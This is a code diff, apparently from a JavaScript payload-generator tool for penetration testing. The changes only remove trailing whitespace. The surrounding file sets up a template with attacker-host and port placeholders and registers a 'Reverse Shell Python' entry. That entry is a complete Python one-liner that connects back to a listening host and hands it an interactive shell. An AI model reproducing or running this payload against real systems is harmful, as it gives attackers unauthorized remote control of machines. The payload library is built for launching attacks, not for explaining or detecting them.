@@ -14,7 +14,7 @@ var question = function(val){
 	questions.push(val);
 }
 
-/* 
+/*
 ###########################################
 ############### Payloads ##################
 ###########################################
@@ -31,9 +31,9 @@ Optional: callback (used for prompt variable)
 * If variables aren't added properly, they will not work
 * Variables can include instructions if needed.
 * Instructions should be kept in parenthesis
-	
+
 	ex: foobar <RHOST> <LHOST> <LPORT>
-	ex: foobar <RHOST (hostname)> <RPORT>	 
+	ex: foobar <RHOST (hostname)> <RPORT>
 
 
 */
@@ -41,7 +41,7 @@ Optional: callback (used for prompt variable)
 // ############### Reverse Shells ######################
 
 Load({
-	title: "Reverse Shell Python", 
+	title: "Reverse Shell Python",
 	payload: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"<PROMPT (shell type)>\",\"-i\"]);'",
 	category: "Reverse Shells",
 	callback: function(bro){
